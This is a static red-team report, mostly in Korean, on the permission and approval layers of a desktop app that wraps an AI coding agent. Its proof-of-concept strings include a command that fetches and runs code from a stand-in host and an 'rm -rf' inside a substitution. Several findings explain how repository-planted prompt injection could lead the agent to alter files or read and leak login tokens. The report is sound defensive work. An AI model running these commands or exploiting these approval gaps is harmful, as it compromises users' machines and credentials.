# Red Team Report — Grok Desktop

**Date:** 2026-08-14 · **Scope:** `apps/desktop`, `packages/{security,shared,acp-client}`, IPC/preload, CLI 세션 연동 · **Method:** static  
**Authorization:** 이 저장소 정적 검토만. 라이브 페이로드·외부 호스트 공격 없음.

## Summary

기본 경계(샌드박스 렌더러, CSP, Zod IPC, sender 검증, realpath 봉쇄, URL 허용 목록, 자식 env 최소화, 토큰 미저장)는 의도대로 막혀 있다. 원격 무인증 RCE나 렌더러→임의 파일 쓰기는 확인하지 못했다.

실제 위험은 **승인 계층이 명령을 과소평가하거나 너무 넓게 기억하는 경우**, **Trusted/세션 허용 + 프롬프트 인젝션 + CLI 자체 쓰기**, **Grok 자격 증명 경로가 민감으로 안 잡히는 경우**, **jsonl 리플레이가 비밀을 안 가리는 경우**다. 프로덕션 `pnpm audit --prod`는 알려진 취약점 0건.

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 3 |
| Medium | 5 |
| Low | 5 |

## Findings

### [HIGH] 명령 치환·세션 허용이 읽기 전용으로 위장된다
- **Location:** `packages/security/src/commands.ts` (`classifyCommand`, `commandHead`), `apps/desktop/src/main/services/permission-engine.ts:104`
- **Type:** OS command injection / broken authorization (CWE-78, CWE-863)
- **Confidence:** High — 분류기 로직이 `$()`, 백틱, 인용된 세미콜론을 분할하지 않는다. 세션 키는 바이너리 이름뿐이다.
- **Impact:** 사용자가 `ls`를 “이 세션에서 허용”하면 이후 `ls $(curl … \| sh)`가 자동 허용된다. 첫 요청이 치환을 담아도 카드 이유가 “읽기 전용 명령”이라 승인을 유도한다.
- **How it works:** `splitCommandSegments`는 `|| && ; |`만 자른다. `ls $(rm -rf dest)`는 한 조각이고 `headOf`는 `ls`다. `READ_ONLY_BINARIES`에 걸려 `alwaysAsk=false`. `grantKey`는 `tool:execute:ls`.
- **Proof of concept:** static — `classifyCommand('ls $(curl https://evil.example/x | sh)')`는 네트워크/삭제로 안 올라간다. `commandHead`는 `'ls'`.
- **Fix:** `$()`, `` ` ``, 줄바꿈, 인용 안 연산자를 보면 `alwaysAsk` + 최소 `high`. 세션 허용 키를 바이너리가 아니라 **정규화한 전체 명령(또는 해시)** 으로 두거나, execute는 세션 허용을 주지 않는다.

### [HIGH] CLI 자체 파일 도구는 앱 쓰기 게이트를 우회한다
- **Location:** `docs/SECURITY_MODEL.md` 7절, `session-manager.ts` `#handleToolCall` vs `#handleWrite`
- **Type:** Security control bypass (CWE-807)
- **Confidence:** High — ACP `fs/write_text_file`만 스냅샷·경로 검사를 강제한다. CLI `edit`/`apply_patch`는 `session/request_permission`만 탄다.
- **Impact:** Trusted 프로필(또는 세션 허용된 `edit`)에서 저장소에 심은 지시문이 에이전트를 유도하면, 앱이 내용을 보기 전에 파일이 바뀐다. 되돌리기 없음. 유출은 fetch/명령 승인이 한 번 더 필요하지만, 로컬 변조·훅 심기는 가능하다.
- **How it works:** `terminal` 능력은 꺼져 있어 셸은 CLI 샌드박스다. 샌드박스는 기본 `off`. 앱은 승인 UI만 얹는다. locations가 비어 있으면 경로 봉쇄도 평가하지 못한다.
- **Proof of concept:** static — 라이브 에이전트에서 `fs/write` 없이 파일 도구가 끝나는 세션은 Git 목록에만 나타난다 (명세가 이미 인정).
- **Fix:** Trusted에서도 첫 쓰기/패치는 내용을 보여 준다. CLI 도구 locations를 비우면 거부. 가능하면 `x.ai/fs/*`를 앱이 중계한다. 기본 샌드박스 `workspace`를 세션 인자로 켠다 (공식 플래그가 있을 때).

### [HIGH] `~/.grok`와 CLI 자격 증명 파일이 작업공간·민감 규칙에서 빠진다
- **Location:** `packages/security/src/paths.ts` `HOME_BLOCKED_SUFFIXES`, `packages/security/src/sensitive.ts` `FILE_RULES`
- **Type:** Sensitive data exposure (CWE-200, CWE-538)
- **Confidence:** High
- **Impact:** 사용자가 `~/.grok`를 폴더로 열면 읽기는 자동 허용이다. `auth.json`, `session.json`, `tokens.json`은 민감 규칙에 안 걸린다 (`credentials.json`만 걸림). 에이전트가 로그인 토큰을 읽고 이후 승인된 네트워크 도구로 유출할 수 있다.
- **How it works:** 홈 루트와 `.ssh`/`.aws`는 차단하지만 `.grok`는 일반 프로젝트로 본다. `classifySensitivity('auth.json')`은 이유가 없다.
- **Proof of concept:** static — `classifyWorkspaceRoot(os.homedir()+'/.grok')`는 `ok`. `isSensitivePath('auth.json')`은 `false`.
- **Fix:** `~/.grok`, `~/.config/grok`를 `blocked`로. `auth.json`/`tokens.json`/`session.json`과 디렉터리 `.grok/`를 민감으로. 민감 읽기는 항상 승인.

### [MEDIUM] CLI jsonl 리플레이·검색 인덱스가 비밀을 가리지 않는다
- **Location:** `apps/desktop/src/main/services/cli-sessions.ts` `replayCliTranscript`, `collectSearchText`; `ipc.ts` `sessionList`
- **Type:** Information exposure (CWE-200)
- **Confidence:** High
- **Impact:** 라이브 경로는 `maskSecrets`를 탄다. 재개·사이드바 `searchText`는 원문이다. API 키·토큰이 렌더러 메모리와 화면으로 간다.
- **Fix:** 리플레이·preview·searchText에 `maskSecrets`를 동일하게 적용한다.

### [MEDIUM] 세션 허용 `tool:edit`가 모든 일반 파일 쓰기를 연다
- **Location:** `permission-engine.ts:25` `grantKeyFor('edit')`, `session-manager.ts` `writeAllowance` / `grants.has(grantKeyFor('edit'))`
- **Type:** Broken authorization (CWE-863)
- **Confidence:** High
- **Impact:** README 한 번 “세션 허용”이면 같은 세션의 `package.json`, 훅, CI 파일도 추가 승인 없이 바뀐다. 민감 파일만 예외.
- **Fix:** 세션 허용을 경로(또는 디렉터리) 단위로. 제네릭 `tool:edit`를 없앤다.

### [MEDIUM] 자동 허용이 CLI `allow_always`로 떨어질 수 있다
- **Location:** `session-manager.ts:656-658`
- **Type:** Privilege escalation via option fallback (CWE-269)
- **Confidence:** Medium — 페이크 에이전트는 `allow_once`와 `allow_always`를 둘 다 준다. 실제 CLI가 `allow_once` 없이 오면 앱이 `allow_always`를 고른다. CLI가 그걸 영구 기억하면 앱 정책을 우회한다.
- **Fix:** 자동 허용은 `allow_once`만. 없으면 사용자에게 묻거나 거부. `allow_always`는 UI에 노출하지 않는다.

### [MEDIUM] `npm run test` / 테스트 바이너리는 alwaysAsk가 아니다
- **Location:** `commands.ts:154-166`
- **Confidence:** High
- **Impact:** `package.json`의 `test` 스크립트는 임의 명령이다. 저장소 인젝션으로 `test`가 설치·유출이 될 수 있다. 세션 허용 키는 `npm`.
- **Fix:** `npm/pnpm/yarn run *`는 항상 묻는다. 또는 스크립트 본문을 읽어 분류한다.

### [MEDIUM] 민감 파일 규칙이 좁다
- **Location:** `sensitive.ts`
- **Confidence:** High
- **Impact:** `.envrc`, `foo.env`, `secrets.env`, `.npmrc` 외의 `netrc`, 많은 `*.pem`이 아닌 토큰 파일은 자동 읽기.
- **Fix:** `*.env`, `.env*`(`.env.example` 제외), `.envrc`, 디렉터리 `.grok`를 추가.

### [MEDIUM] 배포본이 서명되지 않았고 라이브러리 검증이 꺼져 있다
- **Location:** `electron-builder.yml`, `build/entitlements.mac.plist`
- **Confidence:** High
- **Impact:** Gatekeeper가 약한 로컬 빌드. `disable-library-validation` + `allow-unsigned-executable-memory`는 CLI 실행에 필요하지만, 변조된 네이티브 코드 주입 면이 넓다.
- **Fix:** Developer ID 서명·공증. entitlements를 자식에만 inherit.

### [LOW] 마크다운 `data:` 이미지를 그대로 넣는다
- **Location:** `MediaView.tsx:8-12`
- **Impact:** 에이전트 출력의 임의 `data:`가 `<img>`/`<video>`가 된다. Chromium에서 `<img>` SVG 스크립트는 보통 안 돈다. 큰 payload로 메모리 DoS는 가능하다.
- **Fix:** `data:image/(png|jpeg|gif|webp)`와 크기 상한만 허용.

### [LOW] IPC 오류 문자열이 렌더러로 그대로 간다
- **Location:** `ipc.ts:86-89`
- **Impact:** 내부 경로·예외가 UI에 노출. 단일 사용자 앱이라 영향은 작다.
- **Fix:** 채널별 안전한 메시지만 던진다.

### [LOW] 외부 URL이 `*.x.ai` / `*.grok.com` 전체를 허용한다
- **Location:** `packages/security/src/url.ts:47`
- **Impact:** 서브도메인 탈취 시 `openExternal`이 연다. `file:`/`javascript:`는 이미 거부.
- **Fix:** 고정 호스트만. 와일드카드가 필요하면 eTLD+1을 명시.

### [LOW] `GROK_DESKTOP_CLI_PATH` / `PATH`의 첫 `grok`
- **Location:** `packages/acp-client/src/detect.ts`
- **Impact:** 로컬 공격자가 PATH에 가짜 `grok`을 두면 앱이 그걸 띄운다. 같은 사용자 전제.
- **Fix:** 해시/버전 확인, 잘 알려진 경로 우선, 시작 시 경로를 UI에 표시.

### [LOW] 폴더 선택에 `createDirectory`가 켜져 있다
- **Location:** `workspace.ts` `showOpenDialog`
- **Impact:** 네이티브 대화상자에서 새 폴더를 만들 수 있다. 탈출은 아니다.
- **Fix:** 필요하지 않으면 제거.

## Stability & robustness notes

- `listCliSessions`가 목록마다 jsonl 앞 200KB를 읽는다. 세션이 많으면 메인 스레드가 버벅인다 (DoS는 로컬).
- 리플레이 상한 2_000 항목. 그 이상은 UI에서 잘린다 (보안보다 가용성).
- `searchFiles`는 디렉터리 심링크를 따라가지 않지만, 순회 중 교체 TOCTOU는  theoretically 있다. `resolveWithinRoot`를 매 방문에 쓰면 닫힌다.
- 고아 PID는 `ps` 커맨드라인에 `grok`+`agent`가 있을 때만 죽인다. PID 재사용 오탐 면은 작다.

## What I did NOT find / out of scope

막혀 있는 것:

- 렌더러 `nodeIntegration` / 비격리 / 임의 IPC 채널
- `javascript:`·`file:`·자격 증명 포함 URL
- 작업공간 밖 `../`·심링크 부모를 통한 쓰기 (`resolveWithinRoot`)
- `confirmedPath`로 경고 폴더가 아닌 경로 열기
- 민감 첨부·미리보기 (`resolveAttachablePaths`, `readMedia`)
- react-markdown + `rehype-raw` 없음 → 저장형 HTML XSS
- 앱이 인증 토큰을 저장하는 모델
- 프로덕션 의존성 알려진 CVE (`pnpm audit --prod`)

평가하지 않은 것: 실행 중 앱에 대한 동적 XSS 페이로드, 실제 `grok agent stdio`의 `allow_always` 영속, CLI 샌드박스 커널 정책, 서명되지 않은 DMG를 사용자가 열었을 때의 Gatekeeper 동작.

프롬프트 인젝션 자체는 모델 한계다. 완화는 승인을 좁히고, 명령을 과소평가하지 않고, 자격 증명 경로를 열지 않는 것이다.
